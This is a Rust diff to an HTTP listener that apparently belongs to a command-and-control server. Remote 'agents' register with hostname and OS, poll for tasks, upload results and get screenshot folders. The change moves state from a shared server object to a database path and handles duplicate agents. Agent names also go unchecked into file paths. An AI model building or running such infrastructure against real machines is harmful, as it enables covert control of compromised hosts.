@@ -18,10 +18,10 @@ use tower_http::timeout::TimeoutLayer;
 use crate::{
     server::{
         agents::{Agent, AgentData, AgentTask},
+        db,
         jobs::JobMessage,
-        server::Server
     },
-    utils::fs::{read_file, empty_file, write_file},
+    utils::fs::{empty_file, mkdir, mkfile, read_file, write_file},
 };
 
 pub async fn start_http_listener(
@@ -29,18 +29,14 @@ pub async fn start_http_listener(
     host: String,
     port: u16,
     receiver: Arc<Mutex<broadcast::Receiver<JobMessage>>>,
-    server: Arc<Mutex<Server>>,
+    db_path: String,
 ) {
-    let server_clone = Arc::clone(&server);
-    let server_clone_2 = Arc::clone(&server);
     let app = Router::new()
         .route("/", get(hello))
         .route("/reg", post(register))
-        .with_state(server)
+        .with_state(db_path)
         .route("/task/ask", post(task_ask))
-        .with_state(server_clone)
         .route("/task/result", post(task_result))
-        .with_state(server_clone_2)
         .layer((
             TraceLayer::new_for_http(),
             TimeoutLayer::new(Duration::from_secs(10)),
@@ -123,14 +119,14 @@ async fn hello() -> &'static str {
 }
 
 async fn register(
-    State(server): State<Arc<Mutex<Server>>>,
+    State(db_path): State<String>,
     Json(payload): Json<AgentData>,
 ) -> (StatusCode, String) {
 
     info!("Agent requested `/reg`");
 
     let agent = Agent {
-        id: 0,
+        id: 0, // Temporary ID
         name: payload.name,
         hostname: payload.hostname,
         os: payload.os,
@@ -140,20 +136,51 @@ async fn register(
         task_result: None,
     };
 
-    let mut server = server.lock().await;
-    match server.add_agent(&mut agent.to_owned()).await {
-        Ok(_) => (StatusCode::CREATED, "Agent registered.".to_owned()),
+    // Check duplicate
+    match db::exists_agent(db_path.to_owned(), agent.clone()) {
+        Ok(exists) => {
+            if exists {
+                error!("Agent already exists.");
+                // Update the agent name
+                match db::update_agent_name(db_path.to_owned(), agent.clone()) {
+                    Ok(_) => {
+                        info!("Updated the agent name.");
+                        // Create directories and folders for the agent
+                        mkdir(format!("agents/{}/task", agent.name.to_owned())).unwrap();
+                        mkdir(format!("agents/{}/screenshots", agent.name.to_owned())).unwrap();
+                        mkfile(format!("agents/{}/task/name", agent.name.to_owned())).unwrap();
+                        mkfile(format!("agents/{}/task/result", agent.name.to_owned())).unwrap();
+                    }
+                    Err(e) => {
+                        error!("Error updating agent name: {:?}", e);
+                    }
+                }
+                return (StatusCode::OK, "Agent already exists.".to_owned());
+            }
+        }
+        Err(e) => {
+            return (StatusCode::OK, format!("Error: {}", e.to_string()));
+        }
+    }
+
+    match db::add_agent(db_path, agent.clone()) {
+        Ok(_) => {
+            // Create directories and folders for the agent
+            mkdir(format!("agents/{}/task", agent.name.to_owned())).unwrap();
+            mkdir(format!("agents/{}/screenshots", agent.name.to_owned())).unwrap();
+            mkfile(format!("agents/{}/task/name", agent.name.to_owned())).unwrap();
+            mkfile(format!("agents/{}/task/result", agent.name.to_owned())).unwrap();
+
+            (StatusCode::OK, "Agent registered.".to_owned())
+        },
         Err(e) => {
             error!("{e}");
-            (StatusCode::CREATED, "Agent already exists.".to_owned())
+            (StatusCode::OK, "Agent already exists.".to_owned())
         }
     }
 }
 
-async fn task_ask(
-    State(server): State<Arc<Mutex<Server>>>,
-    Json(payload): Json<AgentData>,
-) -> (StatusCode, String) {
+async fn task_ask(Json(payload): Json<AgentData>,) -> (StatusCode, String) {
     info!("Agent requested `/task/ask`");
 
     if let Ok(task) = read_file(format!("agents/{}/task/name", payload.name)) {
@@ -163,10 +190,7 @@ async fn task_ask(
     }
 }
 
-async fn task_result(
-    State(server): State<Arc<Mutex<Server>>>,
-    Json(payload): Json<AgentData>,
-) -> (StatusCode, String) {
+async fn task_result(Json(payload): Json<AgentData>,) -> (StatusCode, String) {
     info!("Agent requested `/task/result`");
 
     if let Ok(_) = write_file(format!("agents/{}/task/result", payload.name), &payload.task_result.unwrap_or(Vec::new())) {
